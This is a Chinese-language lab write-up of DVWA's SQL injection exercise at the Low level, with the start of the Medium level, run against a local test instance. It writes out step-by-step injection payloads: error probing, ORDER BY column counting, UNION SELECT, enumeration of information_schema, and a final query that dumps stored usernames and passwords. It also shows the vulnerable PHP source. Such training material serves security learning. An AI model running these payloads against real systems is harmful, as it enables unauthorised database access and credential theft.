# SQL 注入

## 0x00 Low级别

输入ID值1~5，能够显示不同的账户名

![1622682564233](1622682564233.png)

首先判断是否存在sql注入

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit#
```

页面报错，存在sql注入

![1622683158650](1622683158650.png)

分析报错信息

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

接着判断sql注入的类型，是单引号闭合的字符型

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1' and '1'='1 &Submit=Submit#
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1' and '1'='2 &Submit=Submit#
```

尝试还原服务器端sql语句

```sql
select * from users where id = '$id';
```

使用order by判断字段数量，得知有两个字段数量

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1' order by 1--+&Submit=Submit#
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit#
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1' order by 3--+&Submit=Submit#
```

![1622684223063](1622684223063.png)

用联合查询union select确定显示位置

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=-1' union select 1,2--+&Submit=Submit#
```

![1622684453693](1622684453693.png)

使用version(),database()等函数查询数据库信息

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=-1' union select version(),database()--+&Submit=Submit#
```

![1622684516306](1622684516306.png)

既然MySQL数据库版本在5.0以上那么默认存在information_schema数据库，里面包含整个数据库的数据库名、表名、列名等

使用联合查询得到test库中guestbook和users两张表

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=-1' union select database(),group_concat(table_name) from information_schema.tables where table_schema='test'--+&Submit=Submit#
```

![1622685276659](1622685276659.png)

接着查询users表里的列名，可以看到包含user，password等字段

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=-1' union select database(),group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='users'--+&Submit=Submit#
```

![1622685590219](1622685590219.png)

有了字段名以及数据库表名等信息，就可以直接查询用户名和密码

```http
http://localhost:8080/dvwa/vulnerabilities/sqli/?id=-1' union select database(),group_concat(user,password) from test.users--+&Submit=Submit#
```

![1622685727314](1622685727314.png)

源代码分析，sql语句与之前还原的基本一致，low级别下的并没有注重sql注入的防御

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}
?> 
```

## 0x01 Medium级别

相比于low级别，取消了输入点，换成了下拉式单选框

![1622687507002](1622687507002.png)

但考虑到既然要和服务器端数据库产生交互，那就可以抓包来修改ID的值，同时也存在通过修改数据包实现sql注入的可能，打开Burp Suite抓包

